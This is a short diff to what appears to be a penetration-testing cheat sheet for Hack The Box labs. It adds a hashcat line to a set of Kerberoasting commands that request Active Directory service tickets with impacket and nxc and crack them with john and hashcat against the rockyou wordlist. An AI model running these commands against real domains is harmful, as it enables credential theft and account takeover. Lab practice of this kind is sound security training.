@@ -940,6 +940,7 @@ john hash --fork=4 -w=/usr/share/wordlists/rockyou.txt
 impacket-GetUserSPNs domain.htb/user:pass -dc-ip &lt;DC_IP&gt; -request
 nxc ldap &lt;DC_IP&gt; -u user -p pass --kerberoasting kerb.txt
 hashcat -m 13100 kerb.txt /usr/share/wordlists/rockyou.txt
+hashcat -m 13100 hash /usr/share/wordlists/rockyou.txt --force --potfile-disable
 
     -r /usr/shares/hashcat/rules/best64.rule
 
